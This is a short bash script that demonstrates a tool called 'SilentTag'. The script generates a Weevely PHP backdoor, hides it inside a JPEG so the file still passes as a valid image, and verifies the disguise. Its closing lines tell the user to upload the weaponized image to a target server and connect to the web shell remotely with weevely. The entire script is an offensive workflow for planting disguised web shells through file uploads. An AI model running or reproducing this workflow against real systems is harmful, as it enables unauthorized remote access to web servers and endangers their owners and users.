#!/bin/bash
# Demonstration of SilentTag

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              SilentTag - Demonstration                       ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# Step 1: Generate Weevely backdoor
echo "[Step 1] Generating Weevely backdoor..."
weevely generate demo_password demo_backdoor.php
echo ""

# Step 2: Create sample image
echo "[Step 2] Creating legitimate image file..."
python3 silenttag_cli.py --create-sample demo_image.jpg
echo ""

# Step 3: Inject shell into image
echo "[Step 3] Injecting PHP shell into image..."
python3 silenttag_cli.py demo_image.jpg demo_backdoor.php -o weaponized_demo.jpg
echo ""

# Step 4: Verify
echo "[Step 4] Verifying the weaponized file..."
echo ""
echo "File type check:"
file weaponized_demo.jpg
echo ""
echo "File size comparison:"
ls -lh demo_image.jpg demo_backdoor.php weaponized_demo.jpg
echo ""
echo "Magic bytes (should show JPEG header):"
xxd weaponized_demo.jpg | head -n 2
echo ""

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║            SILENTTAG DEMONSTRATION COMPLETE                  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
echo "✓ Weaponized file created: weaponized_demo.jpg"
echo "✓ File appears as valid JPEG image"
echo "✓ Contains hidden PHP backdoor"
echo ""
echo "To use:"
echo "  1. Upload weaponized_demo.jpg to target"
echo "  2. Connect: weevely http://target/path/weaponized_demo.jpg demo_password"
echo ""
